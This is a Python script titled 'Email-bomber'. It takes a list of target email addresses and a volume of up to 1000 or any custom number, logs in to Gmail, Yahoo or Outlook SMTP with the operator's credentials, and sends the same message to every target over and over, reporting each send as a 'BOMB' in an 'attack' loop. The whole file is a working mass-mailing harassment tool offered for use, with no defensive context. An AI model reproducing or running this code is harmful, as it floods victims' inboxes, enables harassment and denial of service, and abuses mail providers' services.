import smtplib
import sys

# Terminal colours
class bcolours:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[94m'


def banner():
    print(bcolours.GREEN + '+[+[+[ Email-bomber ]+]+]+')
    print(bcolours.GREEN + '+[+[+[ Credit to w3w3w3 for majority of code ]+]+]+')


class Email_Bomber:
    # 
    count = 0

    def __init__(self):
        try:
            # List to hold all target emails
            self.target_emails_list = []
            print(bcolours.RED + '\n+[+[+[ Initializing program ]+]+]+')
            self.num_email_targets = int(input(bcolours.GREEN + 'Enter number of target email addresses -> '))
            # Appends email target to target_emails_list
            for email in range(self.num_email_targets):
                self.target = str(input(bcolours.GREEN + 'Enter target email -> '))
                self.target_emails_list.append(self.target)
            # Input for the number of emails to send to each email address
            self.mode = int(input(
                bcolours.GREEN + 'Enter number of emails mode (1,2,3,4) || 1:(1000) 2:(500) 3:(250) 4:(custom) -> '))
            if int(self.mode) > 4 or int(self.mode) < 1:
                print('Error: Option is invaild. Exiting.')
                sys.exit(1)
        except Exception as err:
            print(f'ERROR: {err}')

    def bomb(self):
        try:
            print(bcolours.RED + '\n+[+[+[ Setting up bomb ]+]+]+')
            self.amount = None
            if self.mode == 1:
                self.amount = 1000
            elif self.mode == 2:
                self.amount = 500
            elif self.mode == 3:
                self.amount = 250
            else:
                self.amount = int(
                    input(bcolours.GREEN + 'Enter custom amount -> '))
            print(
                bcolours.RED + f'\n+[+[+[ Selected mode -> {self.mode} Selected amount -> {self.amount} ]+]+]+')
        except Exception as err:
            print(f'ERROR: {err}')
    
    # Grabs the email server/sender_address/sender_password
    # Connects to smtp server
    def email(self):
        try:
            print(bcolours.RED + '\n+[+[+[ Setting up email ]+]+]+')
            self.server = str(input(
                bcolours.GREEN + 'Enter email server | or select premade options - 1:Gmail 2:Yahoo 3:Outlook -> '))
            premade = ['1', '2', '3']
            default_port = True
            if self.server not in premade:
                default_port = False
                self.port = int(
                    input(bcolours.GREEN + 'Enter port number -> '))

            if default_port == True:
                self.port = 587

            if self.server == '1':
                self.server = 'smtp.gmail.com'
            elif self.server == '2':
                self.server = 'smtp.mail.yahoo.com'
            elif self.server == '3':
                self.server = 'smtp-mail.outlook.com'

            self.from_address = str(
                input(bcolours.GREEN + 'Enter sender address -> '))
            self.from_pass = str(
                input(bcolours.GREEN + 'Enter sender password -> '))
            self.subject = str(input(bcolours.GREEN + 'Enter subject -> '))
            self.body = str(input(bcolours.GREEN + 'Enter body -> '))



            self.s = smtplib.SMTP(self.server, self.port)
            self.s.ehlo()
            self.s.starttls()
            self.s.ehlo()
            self.s.login(self.from_address, self.from_pass)

        except Exception as err:
            print(f'ERROR: {err}')
    
    # Sends the email
    def send(self, sender_address, target_address):
        try:
            self.message = '''From: %s\nTo: %s\nSubject: %s\n%s\n''' % (self.from_address, target_address, self.subject, self.body)
            self.s.sendmail(sender_address, target_address, self.message)
            print(bcolours.YELLOW + f'BOMB: {self.count}')

        except Exception as err:
            print(f'ERROR: {err}')
    
    # Loops through the self.target_emails_list and runs send() function
    def attack(self):
        print(bcolours.RED + '\n+[+[+[ Attacking... ]+]+]+')
        for i in range(self.amount):
            for email in self.target_emails_list:
                self.send(self.from_address,  email)
            self.count += 1
        self.s.close()
        print(bcolours.RED + '\n+[+[+[ Attack finished ]+]+]+')
        sys.exit(0)

    def run(self):
        self.bomb()
        self.email()
        self.attack()


if __name__ == '__main__':
    banner()
    bomb = Email_Bomber()
    bomb.run()
